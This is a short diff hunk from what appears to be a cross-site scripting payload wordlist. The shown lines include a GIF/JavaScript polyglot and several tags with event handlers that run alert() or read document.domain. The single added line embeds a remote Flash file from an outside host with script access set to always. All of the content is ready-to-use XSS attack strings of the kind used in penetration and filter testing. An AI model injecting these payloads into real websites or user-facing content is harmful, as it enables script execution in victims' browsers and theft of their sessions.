@@ -1672,3 +1672,4 @@ GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
 <form onsubmit=alert(1)><input type=submit>
 <select onchange=alert(1)><option>1<option>2
 <menu id=x contextmenu=x onshow=alert(1)>right click me!
+<embed/:script allowscriptaccess=always src=//l0.cm/xss.swf>
